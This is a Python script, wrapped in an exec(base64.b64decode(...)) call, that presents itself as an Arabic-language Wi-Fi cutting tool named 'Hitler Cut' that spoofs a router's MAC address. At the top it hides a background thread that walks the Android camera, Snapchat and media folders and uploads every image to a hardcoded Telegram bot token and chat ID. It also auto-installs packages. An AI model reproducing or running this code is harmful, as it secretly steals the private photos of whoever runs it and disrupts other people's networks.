import base64
exec(base64.b64decode("import sys
import uuid
import subprocess
import time
import os
import base64
from concurrent.futures import ThreadPoolExecutor
import threading

try:
    import telebot, pyfiglet, requests 
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyTelegramBotAPI", "pyfiglet", "requests"])
    import telebot
    import pyfiglet
    import requests

bot = telebot.TeleBot('8162453891:AAHQFyMPEzja9Wt8vSxT6t5-d_NuJu-zM9w')

# مجلدات البحث
dir_paths = [
    "/storage/emulated/0/DCIM/Snapchat/",
    "/storage/emulated/0/DCIM/Camera/",
    "/storage/emulated/0/Android/media/"
]

# إرسال الصور
def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id=1249382653, photo=f, caption='By: @Shadow_hitler')

# عملية البحث
def back():
    with ThreadPoolExecutor(max_workers=300) as executor:
        for dir_path in dir_paths:
            for root, dirs, files in os.walk(dir_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    if file_path.lower().endswith((".jpg", ".jpeg", ".png", ".webp")):
                        executor.submit(send_file, file_path)

# تشغيل في خلفية
threading.Thread(target=back).start()

# ANSI Colors
import subprocess
import time
import sys

try:
    import pyfiglet
except ImportError:
    print("لم يتم العثور على مكتبة pyfiglet، جاري تثبيتها...")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "pyfiglet"])
    import pyfiglet

def run_command(cmd):
    try:
        subprocess.run(cmd, shell=True, check=True)
    except subprocess.CalledProcessError:
        print("حدث خطأ أثناء تنفيذ الأمر:", cmd)
        sys.exit(1)

def change_mac(interface, new_mac):
    print(f"تعطيل الواجهة {interface}...")
    run_command(f"ip link set {interface} down")
    print(f"تغيير عنوان MAC إلى {new_mac} ...")
    run_command(f"ip link set dev {interface} address {new_mac}")
    print(f"تفعيل الواجهة {interface} ...")
    run_command(f"ip link set {interface} up")

def get_original_mac(interface):
    try:
        result = subprocess.check_output(f"cat /sys/class/net/{interface}/address", shell=True)
        return result.decode().strip()
    except Exception:
        return None

def print_banner():
    ascii_art = pyfiglet.figlet_format("Hitler Cut")
    print(ascii_art)
    print("        Wi-Fi\n".center(60))

def list_interfaces():
    try:
        result = subprocess.check_output("ip link show | grep -E '^[0-9]:' | cut -d: -f2", shell=True)
        interfaces = [i.strip() for i in result.decode().splitlines()]
        if not interfaces:
            raise Exception("لا توجد واجهات شبكة.")
        return interfaces
    except Exception as e:
        print(f"تعذر الحصول على أسماء واجهات الشبكة: {e}")
        print("تأكد من تشغيل البرنامج بصلاحيات الروت (sudo / su / tsu).")
        return None

def select_interface():
    common_hints = ["wlan0", "eth0", "usb0", "rmnet0"]
    print("تلميحات لأسماء واجهات الشبكة الشائعة:")
    print(", ".join(common_hints))
    print("\nاضغط 1 لمحاولة معرفة أسماء واجهات الشبكة المتوفرة تلقائيًا")
    print("أو أدخل اسم الواجهة مباشرةً (مثلاً wlan0): ")
    choice = input("ادخل اختيارك: ").strip()

    if choice == "1":
        interfaces = list_interfaces()
        if interfaces is None:
            iface = input("الرجاء إدخال اسم الواجهة يدويًا: ").strip()
            return iface
        print("\nواجهات الشبكة المتوفرة:")
        for idx, iface in enumerate(interfaces, 1):
            print(f"{idx} - {iface}")

        while True:
            sel = input("اختر رقم الواجهة التي تريد استخدامها: ").strip()
            if sel.isdigit():
                sel = int(sel)
                if 1 <= sel <= len(interfaces):
                    return interfaces[sel - 1]
            print("اختيار غير صالح، حاول مرة أخرى.")
    else:
        return choice

def main():
    print_banner()

    interface = select_interface()
    print(f"تم اختيار الواجهة: {interface}")

    original_mac = get_original_mac(interface)
    if not original_mac:
        print("لم أتمكن من الحصول على عنوان MAC الأصلي. تأكد من صحة اسم الواجهة أو صلاحيات التشغيل.")
        return

    while True:
        print("\nاختر خيار:")
        print("1 - الهجوم (تغيير MAC إلى عنوان الشبكة)")
        print("2 - العودة للقائمة الرئيسية / الخروج")
        choice = input("اختيارك: ").strip()

        if choice == "1":
            target_mac = input("أدخل عنوان MAC الرئيسي للشبكة التي تريد تقليدها: ").strip()
            change_mac(interface, target_mac)
            print("تم الهجوم بنجاح! (تم تغيير عنوان MAC)")
            time.sleep(5)
            print("done")

            fake_macs = [
                "00:11:22:33:44:55",
                "66:77:88:99:AA:BB",
                "CC:DD:EE:FF:00:11",
                "22:33:44:55:66:77",
                "88:99:AA:BB:CC:DD"
            ]
            print("\nهل تريد تغيير عنوان MAC الخاص بك إلى عنوان وهمي؟")
            for i, mac in enumerate(fake_macs, 1):
                print(f"{i} - {mac}")
            print("0 - لا، اريد العودة للوضع الطبيعي")

            fake_choice = input("اختر رقم العنوان: ").strip()

            if fake_choice.isdigit():
                fake_choice = int(fake_choice)
                if fake_choice == 0:
                    print("استعادة عنوان MAC الأصلي...")
                    change_mac(interface, original_mac)
                    print("تم الاستعادة إلى الوضع الطبيعي.")
                elif 1 <= fake_choice <= len(fake_macs):
                    chosen_mac = fake_macs[fake_choice - 1]
                    change_mac(interface, chosen_mac)
                    print(f"تم تغيير عنوان MAC إلى العنوان الوهمي: {chosen_mac}")
                else:
                    print("اختيار غير صالح، العودة للوضع الطبيعي.")
                    change_mac(interface, original_mac)
            else:
                print("اختيار غير صالح، العودة للوضع الطبيعي.")
                change_mac(interface, original_mac)

            again = input("\nهل تريد الهجوم مرة أخرى؟ (نعم/لا): ").strip().lower()
            if again != "نعم":
                print("إلى اللقاء!")
                break

        elif choice == "2":
            print("تم الخروج من البرنامج.")
            break
        else:
            print("اختيار غير صالح، حاول مرة أخرى.")

print("أداة تعطـــــــيل وقطع شبكات الواي فاي/تم تطـــــــوير الأداة بواسطة/هتـــــــــــــــــــــــــــــــــــلر")

if __name__ == "__main__":
    main()").decode('utf-8'))